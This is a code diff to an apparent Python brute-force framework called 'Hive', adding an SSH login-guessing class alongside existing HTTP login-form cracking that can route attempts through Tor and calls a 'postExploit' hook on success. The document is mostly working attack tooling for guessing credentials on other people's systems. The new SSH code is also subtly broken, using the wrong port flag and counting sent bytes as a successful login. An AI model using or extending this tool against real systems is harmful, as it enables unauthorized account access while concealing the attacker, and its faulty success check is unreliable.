@@ -6,6 +6,10 @@ import time
 from console import Console
 import random
 from bloomfilter import BloomFilter
+try:
+	import pexpect
+except:
+	print('Issues importing \'pexpect\'.. Try: pip install pexpect')
 
 # class: Hive
 # description: This object's purpose is a basic layout of what is needed to bruteforce logins
@@ -31,6 +35,8 @@ class Hive:
 	verbose = None
 	__onSuccessHandle__ = None
 	bloomfilter = None		# *NOTE* only used if username is not None, Insures passwords were only used once with the specific username
+	target = None
+	logLock = None
 	
 	# function: __init__
 	# description: Constructor - *NOTE* Call parent __init__ from any inherited objects from Hive
@@ -51,6 +57,7 @@ class Hive:
 		self.lastUpdated = time.time()
 		self.verbose = False
 		useTor = False
+		self.logLock = threading.Lock()
 
 	# function: start
 	# param: func_handle(function) 		- The function used to do the main work of bruteforcing
@@ -224,7 +231,7 @@ class Hive:
 			for username in self.getNextUsername():
 				for password in self.getNextPassword():
 					if not self.isFinished:
-						credential = Credential(username,password,self.url)
+						credential = Credential(username,password,self.target)
 						success = self.attemptLogin(credential)
 						self.__displayMessage__(credential, success)
 					else:
@@ -237,7 +244,7 @@ class Hive:
 						# Ensuring the password is used only once with this username
 						# -- Bloomfilter has static lookup speed, regardless of list size
 						if not self.bloomfilter.inArray(password):
-							credential = Credential(self.username,password,self.url)
+							credential = Credential(self.username,password,self.target)
 							success = self.attemptLogin(credential)
 							self.__displayMessage__(credential, success)
 							self.bloomfilter.append(password)	
@@ -326,7 +333,7 @@ class HttpHive(Hive):
 	# Regular-expressions to find the specific forms ----
 	FORM_REGEX = re.compile(r'<form(.*?)<\/form>')
         CLEANUP_REGEX = re.compile(r'\n')
-        NAME_REGEX = re.compile(r'name\=\"(.*?)\"|name\=\'(.*?)\'') # NEEDS ALL POSSIBLE COMBOS
+        NAME_REGEX = re.compile(r'name\=\"(.*?)\"|name\=\'(.*?)\'') 
         VALUE_REGEX = re.compile(r'value\=\"(.*?)\"|value\=\'(.*?)\'')
         LOGIN_REGEX = re.compile(r'<input\stype\=\"password\"|<input\stype\=\'password\'')
         FIELD_REGEX = re.compile(r'(<input\stype\=.*?>)')
@@ -334,7 +341,6 @@ class HttpHive(Hive):
 	AUTHENTICATION_TYPE = re.compile(r'method\=\'(post)\'|method\=\"(post)\"|method\=\'(get)\'|method\=\"(get)\"')
 	# Base payload for our login attempts
 	basePayload = None
-	logLock = None
 	proxies = None
 	form_method = None
 	examplePayload = None 
@@ -342,7 +348,6 @@ class HttpHive(Hive):
 	def __init__(self):
 		Hive.__init__(self)
 		failedbaseline = dict()
-		self.logLock = threading.Lock()
 		self.form_method = 0
 		self.examplePayload = ''
 
@@ -472,6 +477,7 @@ class HttpHive(Hive):
 		self.basePayload = self.__findFields__(login)
 		self.setFailedBaseline(self.basePayload)
 		self.setOnSuccessHandle(self.postExploit)
+		self.target = self.url
 		if self.useTor:
 			self.setupTOR()
 	
@@ -515,3 +521,50 @@ class HttpHive(Hive):
 	# description: Sets up the proxies to use TOR
 	def setupTOR(self):
 		self.proxies = {'http':'socks5://localhost:9050','https':'socks5://localhost:9050'}
+
+
+# class: SSHHive
+# description: Hive used to brute-force ssh logins
+class SSHHive(Hive):
+	baseCommand = None
+	TIMEOUT = 0.5
+	def __init__(self):
+		Hive.__init__(self)
+		
+	# function: attemptLogin	- Overriden
+	# param: Credential		- THe credential to attempt a login with	
+	# return: Boolean		- True if Success | False if Failure
+	# description: This function is responsible for attempting a login with the specified credential, calls other helper functions to get the job done
+	def attemptLogin(self,credential):
+		Hive.attemptLogin(self,credential)
+		success = False
+		command = self.__BuildSSHCommand__(credential)
+		child = pexpect.spawn(command, timeout=self.TIMEOUT)
+		result = child.send(credential.password)
+		if result == 8:
+			success = True		
+		return success
+	
+	# function: __BuildSSHCommand__ 
+	# param: Credential 	- Credential to attempt a login with
+	# description: This is responsible for creating a valid ssh login command 
+	def __BuildSSHCommand__(self,credential):
+		port = 22
+		if credential.port:
+			port = credential.port		
+		command = self.baseCommand%(credential.username,credential.host,port)
+		return command
+	
+	# function: setup
+	# description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
+	def setup(self):
+		Hive.setup(self)
+		self.baseCommand = 'ssh %s@%s -P %s'	
+		self.verbose = True
+
+	# function: postExploit
+	# param: Credential 	- Credential of successful login 
+	# description: This is another example of a post exploit function, as you can see it requires a credential object
+	def postExploit(self,credential):
+		pass
+	
